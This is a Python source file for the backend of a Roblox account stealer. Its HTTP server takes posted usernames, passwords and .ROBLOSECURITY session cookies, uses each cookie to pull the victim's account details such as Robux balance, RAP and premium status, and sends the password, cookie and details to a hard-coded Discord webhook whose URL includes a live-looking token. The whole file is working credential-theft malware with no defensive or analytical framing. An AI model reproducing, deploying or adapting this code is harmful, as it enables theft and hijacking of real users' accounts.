import http.server, socketserver, json, requests, robloxpy, discord, datetime, os

class MyRequestHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.wfile.write(bytes("POST request received", 'utf-8'))

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        
        post_data = self.rfile.read(content_length).decode('utf-8')
        data = json.loads(post_data)

        username = data['a']
        password = data['b']
        cookie = data['c']


        webhook = discord.SyncWebhook.from_url('https://discord.com/api/webhooks/1187857540223082528/pHdjSygf1gsAQ7fFt_xX9VYdcpwngD677KQhUKq1pgW2ynLB4wdBCLlqEIQy3rt2xve6')

        headers = { 'Cookie': '.ROBLOSECURITY=' + cookie, 'User-Agent': 'Roblox/WinInet', 'Referer': 'https://www.roblox.com/' }
        AccountInformation = requests.get('https://www.roblox.com/mobileapi/userinfo', headers=headers).json()
        username = AccountInformation.get('UserName', 'None')
        user_id = AccountInformation.get('UserID', 'None')
        robux = AccountInformation.get('RobuxBalance', 'None')
        rap = robloxpy.User.External.GetRAP(user_id) if user_id else 'Not found'
        creation_date = robloxpy.User.External.CreationDate(user_id) if user_id else 'Not found'
        thumbnail = AccountInformation.get('ThumbnailUrl', 'None')
        builders_club = AccountInformation.get('IsAnyBuildersClubMember', 'None')
        premium = AccountInformation.get('IsPremium', 'None')

        embed = discord.Embed(title=f"New account added on {os.environ['COMPUTERNAME']}", color=0x000000, timestamp=datetime.datetime.now())
        embed.set_thumbnail(url=thumbnail)
        embed.add_field(name="👤 Username:", value=f"```{username}```", inline=True)
        embed.add_field(name="🔑 Password:", value=f"```{password}```", inline=True)
        embed.add_field(name="🌐 User ID:", value=f"```{user_id}```", inline=True)
        embed.add_field(name="📅 Creation Date:", value=f"```{creation_date}```", inline=True)
        embed.add_field(name="\u200b", value="", inline=False)
        embed.add_field(name="💰 Robux:", value=f"```{robux}```", inline=True)
        embed.add_field(name="📊 RAP: ", value=f"```{rap}```", inline=True)
        embed.add_field(name="💎 Premium:", value=f"{'```Yes```' if premium == True else '```No```'}", inline=True)
        embed.add_field(name="\u200b", value="", inline=False)
        embed.add_field(name="🛠️ Builders Club:", value=f"{'```Yes```' if builders_club == True else '```No```'}", inline=True)
        
        cookie_embed = discord.Embed(description=f'🍪 **Cookie:**\n```{cookie}```', color=0x000000, timestamp=datetime.datetime.now())
        webhook.send(embeds=[embed, cookie_embed])

        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(bytes("POST request received", 'utf-8'))

port = 8000

with socketserver.TCPServer(("", port), MyRequestHandler) as httpd:
    print(f"Serving on port {port}")
    # Start the server
    httpd.serve_forever()
